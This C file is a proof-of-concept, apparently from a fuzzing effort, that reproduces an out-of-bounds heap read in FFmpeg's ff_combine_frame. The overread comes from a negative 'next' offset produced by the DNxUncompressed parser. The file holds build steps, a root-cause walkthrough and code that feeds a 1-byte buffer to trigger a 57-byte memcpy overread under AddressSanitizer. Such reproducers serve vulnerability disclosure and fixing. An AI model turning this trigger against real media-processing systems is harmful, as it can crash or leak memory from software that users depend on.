/*
 * PoC for VULN-001: OOB Heap Read in ff_combine_frame via Negative next
 * from dnxuc_parse (libavcodec/dnxuc_parser.c).
 *
 * Build (against the asan+ubsan ffmpeg build):
 *   gcc -fsanitize=address,undefined -g \
 *       -I/data/ylwang/non-textfuzz/target/FFmpeg \
 *       -I/data/ylwang/non-textfuzz/target/FFmpeg/build_test \
 *       poc.c \
 *       /data/ylwang/non-textfuzz/target/FFmpeg/build_test/libavcodec/parser.o \
 *       /data/ylwang/non-textfuzz/target/FFmpeg/build_test/libavutil/libavutil.a \
 *       -lm -lpthread \
 *       -o poc
 *
 * Run:
 *   ASAN_OPTIONS=detect_leaks=0 ./poc
 *
 * Expected ASAN output:
 *   ==PID==ERROR: AddressSanitizer: heap-buffer-overflow on address ... READ of size 57
 *   at pc ... in ff_combine_frame libavcodec/parser.c:...
 *
 * Root cause (libavcodec/dnxuc_parser.c lines 52-72):
 *   dnxuc_parse() scans buf[] via state64 shift-register looking for the
 *   8-byte DNxUncompressed 'pack' header:
 *       [4-byte LE size][p][a][c][k]
 *   When pc->index=7 (7 bytes accumulated from the previous parser call) and
 *   only byte 'k' (0x6B) arrives in the current call (i=0):
 *       state = (prev_state64 << 8) | 0x6B → lower 32 bits = MKBETAG('p','a','c','k')
 *       next = i - 7 = 0 - 7 = -7
 *   ff_combine_frame(&pc, -7, &buf, &buf_size) is then called.
 *
 * Bug in ff_combine_frame() (libavcodec/parser.c ~line 260-276):
 *   pc.index=7 > 0, so:
 *     av_fast_realloc(pc.buffer, &pc.buffer_size, -7 + 7 + 64) → allocates 64 bytes
 *     next(-7) > -AV_INPUT_BUFFER_PADDING_SIZE(-64) → TRUE
 *     memcpy(&pc.buffer[7], buf, -7 + AV_INPUT_BUFFER_PADDING_SIZE)
 *     = memcpy(&pc.buffer[7], buf, 57)    ← buf is a 1-byte allocation!
 *   → heap-buffer-overflow READ of 56 bytes past the end of a 1-byte malloc.
 *
 * This PoC bypasses av_parser_parse2() and calls ff_combine_frame() directly
 * with a manually prepared ParseContext to reproduce the exact conditions.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "libavcodec/parser.h"
#include "libavutil/mem.h"

/*
 * Minimal stubs for symbols referenced by parser.o but not needed by
 * ff_combine_frame itself (av_parser_iterate and avcodec_descriptor_get
 * are used only by av_parser_init/av_parser_close/av_parser_change).
 */
const AVCodecDescriptor *avcodec_descriptor_get(enum AVCodecID id)
{
    (void)id;
    return NULL;
}

const AVCodecParser *av_parser_iterate(void **opaque)
{
    (void)opaque;
    return NULL;
}

int main(void)
{
    ParseContext pc;
    memset(&pc, 0, sizeof(pc));

    /*
     * --- Step 1: Simulate call 1 (7 bytes) ---
     *
     * Feed bytes 0-6 of a DNxUncompressed 'pack' header:
     *   [0x08 0x00 0x00 0x00]  = size=8 in little-endian
     *   [0x70 0x61 0x63]       = 'p' 'a' 'c'   (missing 'k')
     *
     * No 'pack' match possible (need index+i >= 7, but index=0 so i would
     * need to be >= 7, which is impossible for a 7-byte buf).  The call
     * returns END_NOT_FOUND=-100 which causes ff_combine_frame to accumulate
     * the 7 bytes into pc.buffer and set pc.index=7.
     */
    {
        static const uint8_t buf1[] = {
            0x08, 0x00, 0x00, 0x00,   /* LE size = 8  */
            0x70, 0x61, 0x63          /* 'p','a','c'  */
        };
        const uint8_t *b1  = buf1;
        int            s1  = 7;

        /* END_NOT_FOUND = -100 */
        int ret = ff_combine_frame(&pc, /* next= */ -100, &b1, &s1);
        printf("[*] Step 1 (7 bytes): ff_combine_frame returned %d, pc.index=%d\n",
               ret, pc.index);
        if (pc.index != 7) {
            fprintf(stderr, "[-] Expected pc.index=7, got %d – aborting\n", pc.index);
            av_freep(&pc.buffer);
            return 1;
        }
    }

    /*
     * Set the state64 the parser would have written after accumulating those
     * 7 bytes via the shift register:
     *   state64 = 0x08_00_00_00_70_61_63  (7-byte big-endian shift)
     */
    pc.state64 = 0x0008000000706163ULL;

    /*
     * --- Step 2: Simulate call 2 (1 byte 'k') --- THE VULNERABLE CALL ---
     *
     * Allocate EXACTLY 1 byte (no AV_INPUT_BUFFER_PADDING_SIZE), so ASAN
     * will catch the 57-byte overread.
     *
     * In dnxuc_parse at this point:
     *   i=0: state64 = (0x0008000000706163 << 8) | 0x6B = 0x080000007061636B
     *   pc.index + i = 7 + 0 = 7 >= 7  → check fires
     *   (uint32_t)state64 = 0x7061636B = MKBETAG('p','a','c','k')  → MATCH
     *   size = av_bswap32(state64 >> 32) = av_bswap32(0x08000000) = 8 >= 8
     *   next = 0 - 7 = -7
     *
     * ff_combine_frame(&pc, next=-7, buf, buf_size=1) then:
     *   *buf_size = pc.overread_index = 7 + (-7) = 0
     *   pc.index=7 > 0 → realloc pc.buffer to (-7+7+64)=64 bytes
     *   next(-7) > -64 → TRUE
     *   memcpy(&pc.buffer[7], buf, -7+64) = memcpy(&pc.buffer[7], buf, 57)
     *                                       ↑ buf is only 1 byte → OOB READ!
     */
    {
        uint8_t *buf2 = (uint8_t *)malloc(1);   /* NO AV_INPUT_BUFFER_PADDING_SIZE */
        if (!buf2) {
            fprintf(stderr, "[-] malloc(1) failed\n");
            av_freep(&pc.buffer);
            return 1;
        }
        buf2[0] = 0x6B;   /* 'k' */

        const uint8_t *b2 = buf2;
        int            s2 = 1;

        printf("[*] Step 2 (1 byte 'k') from malloc(1) buffer @ %p\n", (void*)buf2);
        printf("[*] pc.index=%d, calling ff_combine_frame with next=-7\n", pc.index);
        printf("[*] Expecting ASAN heap-buffer-overflow READ of size 57 ...\n");
        fflush(stdout);

        /*
         * This call triggers:
         *   memcpy(&pc.buffer[7], buf2, 57)
         * buf2 is 1 byte. ASAN will report a 56-byte overread.
         */
        int ret = ff_combine_frame(&pc, /* next= */ -7, &b2, &s2);

        /* Should not be reached */
        printf("[!] ff_combine_frame returned %d (ASAN should have aborted above)\n", ret);
        free(buf2);
    }

    av_freep(&pc.buffer);
    return 0;
}
